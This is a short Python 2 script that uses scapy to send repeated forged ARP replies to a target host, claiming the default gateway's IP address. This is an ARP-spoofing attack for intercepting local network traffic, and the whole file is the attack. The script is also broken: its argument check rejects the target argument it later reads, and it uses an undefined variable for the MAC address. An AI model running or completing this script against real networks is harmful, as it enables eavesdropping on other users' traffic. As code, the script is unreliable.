from scapy.all import *
import sys
import netifaces


myip = ""
myiip = ""
mymac = ""
gateip = ""
targetip = ""
targetmac = ""

if len(sys.argv) != 1:
	print "Error Code 2"
	sys.exit(1)
myip = netifaces.interfaces()
myip = myip[1]
myip_get = netifaces.ifaddresses(myip)
mymac = myip_get[17][0]['addr']
myiip = myip_get[2][0]['addr']
print mymac,myiip
gate = netifaces.gateways()
gateip = gate['default'][2][0]

packet = Ether()/ARP(hwsrc=mac,psrc=gateip,pdst=sys.argv[1])

sendp(packet, inter =2, count = 50)